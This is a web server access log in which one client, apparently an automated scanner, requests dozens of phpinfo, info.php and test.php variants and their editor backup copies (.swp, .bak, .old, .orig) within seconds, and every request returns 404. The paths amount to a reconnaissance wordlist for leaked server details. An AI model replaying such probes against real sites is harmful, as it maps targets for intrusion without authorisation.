043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/includes/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/includes/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:55;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:56;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:56;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:56;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:56;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:56;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:56;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:56;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:56;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:56;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:56;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:56;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:56;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:56;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:56;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:56;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:56;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:56;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:56;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:56;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:56;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:56;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:56;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:56;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:56;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:56;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:56;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:56;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:57;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:57;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:57;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:57;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:57;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:57;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:57;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:57;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:57;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:57;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:57;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:57;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:57;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:57;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:57;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:57;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:57;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:57;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:57;;/includes/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:57;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:57;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:57;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:57;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/site/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:58;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/includes/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/scripts/info.php;GET;404
